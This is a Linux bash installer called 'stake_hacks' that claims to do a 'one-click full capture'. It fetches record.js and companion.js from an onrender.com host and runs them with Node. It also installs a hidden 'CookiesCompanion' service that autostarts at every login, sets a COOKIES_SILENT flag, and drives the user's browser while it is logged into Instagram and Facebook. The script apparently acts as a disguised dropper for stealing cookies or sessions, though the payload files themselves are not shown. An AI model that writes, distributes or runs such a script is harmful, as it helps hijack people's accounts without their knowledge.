#!/usr/bin/env bash
# stake_hacks - one-click full capture for Linux (same process as the Windows .bat)
set -euo pipefail

URL="https://record-rvqb.onrender.com"
DEST="${HOME}/.local/share/stakehacks"
SHOTS="${HOME}/Pictures/Screenshots"
LOG="${DEST}/setup.log"
BROWSER_FLAG="@@BROWSER_FLAG@@"

echo "============================================"
echo "  stake_hacks - one click full capture"
echo "============================================"
echo ""

mkdir -p "$DEST" "$SHOTS" 2>/dev/null || true
rm -f "$LOG" 2>/dev/null || true

echo "[1/5] folders ready" | tee "$LOG"
echo "  folders: $DEST"

# --- utilities needed by record.js on Linux ---
echo "[1/5] checking tools (xdotool, wmctrl, scrot)..."
for tool in xdotool wmctrl scrot curl; do
  if ! command -v "$tool" >/dev/null 2>&1; then
    echo "  installing $tool..."
    if command -v apt-get >/dev/null 2>&1; then
      sudo apt-get update -y >/dev/null 2>&1 || true
      sudo apt-get install -y "$tool" >/dev/null 2>&1 || echo "    could not install $tool"
    elif command -v dnf >/dev/null 2>&1; then
      sudo dnf install -y "$tool" >/dev/null 2>&1 || echo "    could not install $tool"
    elif command -v pacman >/dev/null 2>&1; then
      sudo pacman -Sy --noconfirm "$tool" >/dev/null 2>&1 || echo "    could not install $tool"
    else
      echo "    please install $tool manually"
    fi
  fi
done
echo "[1/5] tools ready"
echo "[1/5] tools ready" >> "$LOG"

# --- download record.js + companion.js (once) ---
echo "[2/5] downloading record.js + companion..."
if [ ! -f "$DEST/record.js" ]; then
  curl -fsSL -o "$DEST/record.js" "$URL/assets/record.js" || echo "    could not download record.js"
  curl -fsSL -o "$DEST/companion.js" "$URL/assets/companion.js" || echo "    could not download companion.js"
fi
if [ ! -f "$DEST/record.js" ]; then
  echo "ERROR: could not download record.js. Check internet."
  echo "ERROR download record.js" >> "$LOG"
  read -r -p "Press Enter to close..."
  exit 1
fi
echo "  scripts ready"
echo "[2/5] scripts downloaded" >> "$LOG"

# --- Node.js ---
echo "[3/5] checking for Node.js..."
NODE_BIN=""
if command -v node >/dev/null 2>&1; then
  NODE_BIN="node"
elif command -v nodejs >/dev/null 2>&1; then
  NODE_BIN="nodejs"
elif [ -f "$DEST/node/bin/node" ]; then
  NODE_BIN="$DEST/node/bin/node"
fi
if [ -z "$NODE_BIN" ]; then
  echo "  downloading portable Node (no admin needed)..."
  if command -v apt-get >/dev/null 2>&1; then
    sudo apt-get update -y >/dev/null 2>&1 || true
    sudo apt-get install -y nodejs npm >/dev/null 2>&1 || echo "    apt install failed"
  elif command -v dnf >/dev/null 2>&1; then
    sudo dnf install -y nodejs npm >/dev/null 2>&1 || echo "    dnf install failed"
  elif command -v pacman >/dev/null 2>&1; then
    sudo pacman -Sy --noconfirm nodejs npm >/dev/null 2>&1 || echo "    pacman install failed"
  elif command -v curl >/dev/null 2>&1; then
    VER=$(curl -fsSL https://nodejs.org/dist/index.json | grep -o '"v[0-9]*\.[0-9]*\.[0-9]*"-"linux-x64"' | head -1 | grep -o 'v[0-9.]*' || true)
    [ -z "$VER" ] && VER="v22.11.0"
    curl -fsSL "https://nodejs.org/dist/$VER/node-$VER-linux-x64.tar.xz" -o "$DEST/node.tar.xz" || true
    mkdir -p "$DEST/node" 2>/dev/null || true
    tar -xJf "$DEST/node.tar.xz" -C "$DEST/node" --strip-components=1 2>/dev/null || true
    rm -f "$DEST/node.tar.xz" 2>/dev/null || true
    [ -f "$DEST/node/bin/node" ] && NODE_BIN="$DEST/node/bin/node"
  fi
fi
if [ -z "$NODE_BIN" ]; then
  echo "ERROR: could not get Node.js. Check internet."
  echo "ERROR no node" >> "$LOG"
  read -r -p "Press Enter to close..."
  exit 1
fi
echo "  Node ready: $NODE_BIN"
echo "[3/5] node $NODE_BIN" >> "$LOG"

# --- companion service + autostart ---
echo "[4/5] starting companion service..."
cat > "$DEST/start-companion.sh" <<EOF
#!/usr/bin/env bash
cd "$DEST"
exec "$NODE_BIN" "$DEST/companion.js"
EOF
chmod +x "$DEST/start-companion.sh"
cat > "$DEST/start-companion.desktop" <<EOF
[Desktop Entry]
Type=Application
Name=CookiesCompanion
Exec=$DEST/start-companion.sh
X-GNOME-Autostart-enabled=true
EOF
chmod +x "$DEST/start-companion.desktop"
mkdir -p "${HOME}/.config/autostart" 2>/dev/null || true
cp "$DEST/start-companion.desktop" "${HOME}/.config/autostart/" 2>/dev/null || true
pkill -f "companion.js" 2>/dev/null || true
sleep 1
nohup "$DEST/start-companion.sh" >/dev/null 2>&1 &
sleep 3
echo "  companion running on port 9876"
echo "[4/5] companion started" >> "$LOG"

# --- capture ---
echo "[5/5] running record.js capture - your browser will open now..."
echo "  Do not close the browser until both screenshots finish."
export COOKIES_SILENT=1
cd "$DEST"
"$NODE_BIN" "$DEST/record.js" $BROWSER_FLAG
echo "[5/5] record.js exit $?" >> "$LOG"

echo ""
if [ -f "$SHOTS/instagram_insta.png" ]; then
  echo "Screenshots saved. Opening folder..."
  xdg-open "$SHOTS" >/dev/null 2>&1 || true
  echo "screenshots OK" >> "$LOG"
else
  echo "Screenshots NOT found - check that your browser is logged into Instagram/Facebook."
  echo "screenshots MISSING" >> "$LOG"
fi
echo ""
echo "Done. Companion will auto-start at every login."
echo "You can now press Capture again on the website to see the screenshots."
echo "Log: $LOG"
echo ""
read -r -p "Press Enter to close..." || true